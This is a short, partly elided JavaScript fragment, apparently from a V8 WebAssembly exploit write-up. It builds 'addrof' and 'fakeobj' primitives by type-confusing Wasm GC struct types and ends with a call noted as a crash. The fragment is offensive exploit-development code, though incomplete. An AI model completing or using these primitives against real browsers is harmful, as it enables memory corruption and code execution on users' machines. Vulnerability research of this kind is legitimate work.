    ...
    // init canon idx:
    // 0: kPredefinedArrayI8Index       (arr {i8})
    // 1: kPredefinedArrayI16Index      (arr {i16})
    // 2: kWasmExceptionTagSignature    (func () -> (externref))
    // total canon 5
    ...
    */
    ...
    builder.addFunction('addrof', $sig_i_r).addBody([
        kExprLocalGet, 0,
        kGCPrefix, kExprStructNew, $s3,
        kGCPrefix, kExprStructNew, $s2,
        kGCPrefix, kExprStructGet, $s4, 0,
    ...
    builder.addFunction('fakeobj', $sig_r_i).addBody([
        ...
        kGCPrefix, kExprStructNew, $s4,
        kGCPrefix, kExprStructGet, $s2, 0,
        kGCPrefix, kExprStructGet, $s3, 0,
    ]).exportFunc();
    
    let instance2 = builder.instantiate();
    let {addrof, fakeobj} = instance2.exports;

    console.log(addrof("test"));    // crash
